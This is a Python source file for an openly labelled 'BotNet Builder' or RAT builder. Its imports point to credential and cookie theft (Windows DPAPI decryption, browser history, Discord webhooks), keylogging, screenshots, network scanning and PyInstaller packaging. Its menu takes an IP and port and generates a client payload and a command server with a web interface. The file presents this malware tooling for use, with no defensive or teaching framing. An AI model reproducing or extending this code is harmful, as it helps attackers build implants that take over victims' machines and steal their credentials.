# Botnet Modules
try:
    import os
    import re
    import ssl
    import sys
    import wmi
    import json
    import hmac
    import uuid
    import socks
    import httpx
    import ctypes
    import socket
    import ipinfo
    import folium
    import shutil
    import signal
    import psutil
    import random
    import asyncio
    import zipfile
    import sqlite3
    import platform
    import requests
    import keyboard
    import win32api
    import datetime
    import threading
    import subprocess
    import cloudscraper
    import win32process
    import requests_toolbelt

    import tkinter as tk
    import undetected_chromedriver as webdriver

    from multiprocessing import Process, active_children, cpu_count, Pipe
    from discord_webhook import DiscordWebhook, DiscordEmbed
    from PyInstaller import __main__ as pyinstaller
    from requests.cookies import RequestsCookieJar
    from Crypto.Util.number import long_to_bytes
    from win32crypt import CryptUnprotectData
    from browser_history import get_history
    from binascii import hexlify, unhexlify
    from Crypto.Util.Padding import unpad
    from hashlib import sha1, pbkdf2_hmac
    from scapy.all import ARP, Ether, srp
    from pyasn1.codec.der import decoder
    from Crypto.Cipher import DES3, AES
    from pynput.mouse import Controller
    from flask_socketio import SocketIO
    from random import randint, choice
    from urllib.parse import urlparse
    from re import findall, match
    from cookies_package import *
    from tempfile import mkdtemp
    from base64 import b64decode
    from struct import unpack
    from PIL import ImageGrab
    from pathlib import Path
    from typing import Tuple
    from queue import Queue
    from pyotp import TOTP
    from time import sleep
    from tkinter import *
    from ctypes import *
    from flask import *
except: print(f"[-] Required modules not downloaded, please run 'setup.bat' to download modules and run again"); exit()




from util.plugins.common import *
from colorama import Fore
from cookies_package import *
from time import sleep

from util.create_files import create_client_payload, create_server_payload


def main_menu():
    clear()
    settitle("BotNet Builder")
    
    print(banner)
    choice = str(input(f'{Fore.CYAN}Choice {Fore.YELLOW}>> {Fore.RESET}'))
 

    if choice == '1':       # Create Client PayLoad
        clear()
        settitle("Creating Client Payload")
        ip = str(input(f'{Fore.CYAN}Enter ip {Fore.YELLOW}>> {Fore.RESET}'))
        port = str(input(f'{Fore.CYAN}Enter port {Fore.YELLOW}>> {Fore.RESET}'))

        create_client_payload(ip, port)
        main_menu()

    elif choice == '2':     # Create Server
        clear()
        settitle("Creating Server")
        ip = str(input(f'{Fore.CYAN}Enter ip {Fore.YELLOW}>> {Fore.RESET}'))
        port = str(input(f'{Fore.CYAN}Enter port {Fore.YELLOW}>> {Fore.RESET}'))

        host_ip = str(input(f'{Fore.CYAN}Enter webgui host ip (pc local IP){Fore.YELLOW}>> {Fore.RESET}'))
        host_port = str(input(f'{Fore.CYAN}Enter webgui host port (any port not the same as server){Fore.YELLOW}>> {Fore.RESET}'))
        
        create_server_payload(ip, port, host_ip, host_port)
        main_menu()

    elif choice == '420':   # Exit RAT Builder
        settitle("Exiting...")
        exit()
        
    else:                   # Invalid Choice
        clear()
        print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
        sleep(1)
        main_menu()


if __name__ == "__main__": main_menu()